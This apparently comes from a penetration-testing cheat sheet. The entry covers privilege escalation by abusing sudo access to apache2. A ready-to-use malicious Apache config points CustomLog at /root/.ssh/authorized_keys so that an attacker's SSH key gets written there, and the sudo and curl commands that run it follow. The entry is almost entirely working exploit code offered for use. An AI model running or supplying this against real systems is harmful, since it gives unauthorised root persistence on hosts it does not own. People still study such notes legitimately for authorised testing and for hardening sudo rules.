# sudo apache2 LogFormat Arbitrary File Write

If sudo lets you run `apache2`/`httpd` as root with a custom config, abuse `LogFormat` + `CustomLog` to write attacker-controlled content to an arbitrary root-owned file.

```apache
# minimal evil.conf
ServerRoot "/tmp/myapache"
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
Listen *:7777
ErrorLog /tmp/myapache/error.log
LogFormat "<content-you-want-written, e.g. your SSH pubkey>" tag
CustomLog /root/.ssh/authorized_keys tag
```

```bash
sudo apache2 -f /tmp/myapache/evil.conf -k start
curl localhost:7777   # any request triggers the log write
```
